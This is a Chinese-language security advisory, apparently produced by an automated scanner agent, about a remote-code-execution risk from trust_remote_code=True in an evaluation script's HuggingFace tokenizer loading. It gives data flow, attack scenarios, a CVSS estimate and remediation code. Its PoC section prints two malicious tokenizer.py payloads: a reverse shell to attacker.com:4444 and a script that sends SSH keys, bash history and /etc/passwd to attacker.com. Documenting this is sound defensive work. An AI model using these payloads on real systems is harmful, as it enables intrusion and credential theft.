# VULN-SEC-TRUST-001：评估模块trust_remote_code启用致HuggingFace远程代码执行

## 漏洞基本信息

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-SEC-TRUST-001 |
| **CWE** | CWE-940 (Improper Verification of Source of a Communication Channel) |
| **严重性** | High |
| **置信度** | 80/100 |
| **位置** | `evaluation.py:383` |
| **函数** | `main` |
| **模块** | evaluation |

---

## 漏洞原理详解

### HuggingFace trust_remote_code 机制

当使用 `AutoTokenizer.from_pretrained(trust_remote_code=True)` 时，HuggingFace Transformers 会执行模型目录中的自定义代码文件。

**执行机制**:
1. 检查 `config.json` 中的 `auto_map` 字段
2. 加载 `tokenizer.py` 或 `tokenization_*.py`
3. 加载 `modeling.py` 或 `modeling_*.py`
4. 这些文件可以包含任意 Python 代码

---

## 漏洞代码

```python
# evaluation.py:375-383

def main():
    initialize_megatron(args_defaults={'no_load_rng': True, 'no_load_optim': True})
    args = get_args()
    
    model = MegatronModuleForCausalLM.from_pretrained(
        model_provider=model_provider,
        pretrained_model_name_or_path=args.load
    )
    
    # 危险！trust_remote_code=True
    tokenizer = AutoTokenizer.from_pretrained(
        args.tokenizer_name_or_path,  # 来自 CLI 参数
        trust_remote_code=True,        # 允许执行自定义代码
        local_files_only=True          # 仅本地加载，但本地文件可能被篡改
    )
```

---

## 数据流分析

```
Source: CLI 参数 --tokenizer-name-or-path
  ↓
argparse: args.tokenizer_name_or_path
  ↓
AutoTokenizer.from_pretrained(args.tokenizer_name_or_path, ...)
  ↓
检查 config.json 中的 auto_map
  ↓
加载 tokenizer.py / tokenization_*.py
  ↓ [SINK - 执行模型目录中的自定义代码]
恶意 tokenizer.py 执行 → RCE
```

---

## 攻击载荷构造 (PoC)

### Payload: 恶意 tokenizer.py

```python
# 创建恶意模型目录结构
# /malicious_model/
# ├── config.json
# ├── tokenizer.py  ← 恶意代码
# ├── pytorch_model.bin

# config.json 内容
{
    "model_type": "custom",
    "auto_map": {
        "AutoTokenizer": ["tokenizer", null]
    }
}

# tokenizer.py 内容 (恶意代码)
import os
import socket

# 模块加载时立即执行
def setup_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('attacker.com', 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.system('/bin/bash -i')

setup_shell()

# 正常的 tokenizer 实现 (掩盖恶意代码)
class CustomTokenizer:
    def __init__(self, vocab_file):
        self.vocab = {}
    
    def encode(self, text):
        return []
    
    def decode(self, ids):
        return ""
```

**执行攻击**:
```bash
python evaluation.py --tokenizer-name-or-path /malicious_model --task mmlu
# → AutoTokenizer.from_pretrained() 加载 tokenizer.py
# → setup_shell() 执行 → 反向 shell 连接
```

### Payload: 数据窃取 tokenizer

```python
# tokenizer.py
import os
import json

# 窃取敏感文件
sensitive_files = [
    '~/.ssh/id_rsa',
    '~/.bash_history',
    '/etc/passwd'
]

data = {}
for f in sensitive_files:
    try:
        data[f] = open(os.path.expanduser(f)).read()
    except: pass

# 发送到攻击者
import urllib.request
urllib.request.urlopen(
    'https://attacker.com/collect',
    data=json.dumps(data).encode()
)

# 正常 tokenizer 实现...
```

---

## 攻击场景描述

### 场景 1: HuggingFace Hub 供应链攻击

1. **攻击者**在 HuggingFace Hub 发布"优化版"模型
2. 模型包含恶意 `tokenizer.py` 文件
3. **用户**下载模型到本地缓存
4. 执行评估: `python evaluation.py --tokenizer-name-or-path attacker/model`
5. 即使 `local_files_only=True`，本地缓存中的恶意代码被执行
6. 系统被攻陷

### 场景 2: 本地模型篡改

1. 攻击者获得本地模型目录的写入权限
2. 修改现有模型的 `tokenizer.py` 文件
3. 用户执行评估 → 恶意代码执行

### 场景 3: 内部模型分发攻击

1. 恶意内部人员在内部模型仓库注入恶意代码
2. 其他员工下载并使用模型
3. 执行评估 → 系统被攻陷

---

## 利用条件

| 条件 | 是否满足 |
|------|----------|
| 用户可控模型路径 | ✓ (--tokenizer-name-or-path) |
| trust_remote_code=True | ✓ (明确设置) |
| local_files_only=True | ✓ (但无法防止本地篡改) |
| 无模型完整性校验 | ✓ (无签名/hash) |

**关键误解**: `local_files_only=True` 仅阻止网络下载，但**无法防止本地文件的恶意代码执行**！

---

## HuggingFace 安全历史

HuggingFace 曾检测到多个恶意模型:

| 事件 | 描述 |
|------|------|
| 2023-09 | 检测到尝试执行系统命令的恶意模型 |
| 2024-03 | 发现伪装成知名模型的恶意副本 |
| 2025-01 | 发现利用 pickle 漏洞的恶意 checkpoint |

---

## 修复建议

### 立即修复 (High)

```python
# evaluation.py 修复

# 定义可信模型哈希注册表
TRUSTED_MODEL_HASHES = {
    'meta-llama/Llama-2-7b-hf': 'sha256:abc123...',
    'mistralai/Mistral-7B-v0.1': 'sha256:def456...',
    'Qwen/Qwen-7B': 'sha256:789abc...',
}

def load_tokenizer_secure(model_path: str, allow_remote_code: bool = False):
    """安全的 tokenizer 加载"""
    
    from pathlib import Path
    import hashlib
    
    # 1. 获取模型 ID 或路径
    model_id = model_path.split('/')[-1] if '/' in model_path else model_path
    
    # 2. 如果启用 trust_remote_code，必须验证
    if allow_remote_code:
        # 检查是否在可信注册表中
        if model_id not in TRUSTED_MODEL_HASHES:
            raise ValueError(
                f"Model '{model_id}' not in trusted registry. "
                "Contact security team to verify and add model hash."
            )
        
        # 验证完整性
        if Path(model_path).exists():
            # 计算 tokenizer.py 的哈希
            tokenizer_file = Path(model_path) / 'tokenizer.py'
            if tokenizer_file.exists():
                file_hash = hashlib.sha256(
                    tokenizer_file.read_bytes()
                ).hexdigest()
                expected = TRUSTED_MODEL_HASHES[model_id]
                if file_hash != expected.split(':')[1]:
                    raise ValueError(
                        f"Tokenizer integrity check failed for {model_id}"
                    )
        
        # 用户警告
        import logging
        logging.warning(
            f"Loading model '{model_id}' with trust_remote_code=True. "
            "This executes custom code from the model directory!"
        )
    
    # 3. 加载
    return AutoTokenizer.from_pretrained(
        model_path,
        trust_remote_code=allow_remote_code,
        local_files_only=True
    )

# 主函数修改
def main():
    ...
    # 默认禁用 trust_remote_code
    tokenizer = load_tokenizer_secure(
        args.tokenizer_name_or_path,
        allow_remote_code=False  # 默认安全
    )
```

### 长期方案

1. **移除 trust_remote_code**: 强制所有用户使用标准 tokenizer
2. **模型签名机制**: 对可信模型进行 GPG 签名
3. **沙箱隔离**: 在容器中执行评估任务
4. **安全审查流程**: 建立模型安全审查机制

---

## CVSS 评分预估

**CVSS 3.1**: **8.1 (High)**

| 指标 | 值 |
|------|-----|
| Attack Vector | Network (N) |
| Attack Complexity | Low (L) |
| Privileges Required | None (N) |
| User Interaction | Required (R) |
| Scope | Unchanged (U) |
| Confidentiality | High (H) |
| Integrity | High (H) |
| Availability | High (H) |

---

## 相关参考

- HuggingFace Security: https://huggingface.co/docs/security
- trust_remote_code 文档: https://huggingface.co/docs/transformers/custom_models

---

**报告生成时间**: 2026-04-20  
**分析者**: Security Scanner Agent